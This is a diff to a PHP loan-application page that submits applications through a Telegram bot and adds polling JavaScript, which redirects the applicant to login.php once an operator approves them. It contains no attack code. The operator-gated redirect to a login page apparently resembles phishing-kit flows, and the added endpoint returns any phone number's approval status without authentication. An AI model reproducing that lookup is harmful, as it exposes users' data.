@@ -209,6 +209,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
         $telegram_error = $result['description'] ?? "Unknown Telegram error";
     }
 }
+
+// Handle AJAX request to check allow status
+if (isset($_GET['check_allow']) && isset($_GET['phone'])) {
+    header('Content-Type: application/json');
+    $phone = $_GET['phone'];
+    $allowValue = 0;
+    
+    if ($conn && !empty($phone)) {
+        $checkAllowSQL = "SELECT allow FROM users WHERE phone = $1";
+        $checkAllowResult = pg_query_params($conn, $checkAllowSQL, [$phone]);
+        
+        if ($checkAllowResult && pg_num_rows($checkAllowResult) > 0) {
+            $row = pg_fetch_assoc($checkAllowResult);
+            $allowValue = (int)$row['allow'];
+        }
+    }
+    
+    echo json_encode(['allow' => $allowValue]);
+    exit;
+}
 ?>
 
 <!DOCTYPE html>
@@ -229,6 +249,39 @@ body { margin:0; font-family:Arial; background:#f2f2f2; }
 .submit { background:#4f46e5; color:#fff; width:100%; }
 .error { background:#ffdddd; padding:10px; margin-bottom:10px; }
 .success { background:#ddffdd; padding:10px; margin-bottom:10px; }
+.loader {
+    border: 3px solid #f3f3f3;
+    border-top: 3px solid #4f46e5;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+    margin: 20px auto;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+.status-message {
+    text-align: center;
+    padding: 20px;
+}
+.status-waiting {
+    color: #f59e0b;
+    font-weight: bold;
+}
+.status-approved {
+    color: #10b981;
+    font-weight: bold;
+}
+.redirect-message {
+    text-align: center;
+    margin-top: 20px;
+    padding: 10px;
+    background: #e0e7ff;
+    border-radius: 8px;
+    color: #4f46e5;
+}
 </style>
 </head>
 <body>
@@ -249,10 +302,6 @@ body { margin:0; font-family:Arial; background:#f2f2f2; }
 </div>
 <?php endif; ?>
 
-<?php if ($telegram_success && !$telegram_error): ?>
-
-<?php endif; ?>
-
 <div class="section">
 <h4>Loan Details</h4>
 <div class="item"><span>Type</span><span><?= htmlspecialchars($loan_type) ?></span></div>
@@ -268,20 +317,101 @@ body { margin:0; font-family:Arial; background:#f2f2f2; }
 <div class="item"><span>Phone</span><span>+263 <?= htmlspecialchars($phone) ?></span></div>
 </div>
 
-<?php if (!$telegram_success): ?>
+<?php if (!$telegram_success && !isset($_SESSION['application_submitted'])): ?>
 <form method="POST">
     <button type="submit" name="submit_application" class="btn submit">
         SUBMIT APPLICATION
     </button>
 </form>
-<?php else: ?>
-<div style="text-align: center; margin-top: 20px;">
-    <p>⏳ in progress...</p>
+<?php elseif ($telegram_success || isset($_SESSION['application_submitted'])): ?>
+<div id="statusContainer">
+    <div class="status-message">
+        <div class="loader"></div>
+        <p class="status-waiting">⏳ Application Submitted!</p>
+        <p>Your application is being reviewed by our team.</p>
+        <p>Please wait while we process your request...</p>
+        <p style="font-size: 12px; color: #666; margin-top: 10px;">This page will automatically redirect once approved.</p>
+    </div>
 </div>
 <?php endif; ?>
 
 </div>
 </div>
+
+<?php if ($telegram_success || isset($_SESSION['application_submitted'])): ?>
+<script>
+// Get the phone number from PHP
+const phoneNumber = "<?= htmlspecialchars($phone) ?>";
+let checkInterval = null;
+let redirectAttempted = false;
+
+function checkAllowStatus() {
+    if (redirectAttempted) return;
+    
+    fetch(`?check_allow=1&phone=${encodeURIComponent(phoneNumber)}&t=${Date.now()}`)
+        .then(response => response.json())
+        .then(data => {
+            console.log('Allow status:', data.allow);
+            
+            if (data.allow === 1) {
+                // Status is 1, redirect to login.php
+                if (!redirectAttempted) {
+                    redirectAttempted = true;
+                    
+                    // Show redirect message
+                    const statusContainer = document.getElementById('statusContainer');
+                    if (statusContainer) {
+                        statusContainer.innerHTML = `
+                            <div class="redirect-message">
+                                <p>✅ Application Approved!</p>
+                                <p>Redirecting to login page...</p>
+                                <div class="loader"></div>
+                            </div>
+                        `;
+                    }
+                    
+                    // Clear the interval
+                    if (checkInterval) {
+                        clearInterval(checkInterval);
+                    }
+                    
+                    // Redirect after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = 'login.php';
+                    }, 2000);
+                }
+            } else if (data.allow === 0) {
+                // Still waiting, update status message
+                const statusContainer = document.getElementById('statusContainer');
+                if (statusContainer && !statusContainer.querySelector('.redirect-message')) {
+                    // Optional: Update waiting message with timer
+                    const statusDiv = statusContainer.querySelector('.status-message');
+                    if (statusDiv) {
+                        // You can add additional waiting indicators here
+                    }
+                }
+            }
+        })
+        .catch(error => {
+            console.error('Error checking allow status:', error);
+        });
+}
+
+// Start checking every 3 seconds
+if (phoneNumber) {
+    checkInterval = setInterval(checkAllowStatus, 3000);
+    // Also check immediately
+    checkAllowStatus();
+}
+
+// Clean up interval when page unloads
+window.addEventListener('beforeunload', () => {
+    if (checkInterval) {
+        clearInterval(checkInterval);
+    }
+});
+</script>
+<?php endif; ?>
 
 </body>
 </html>
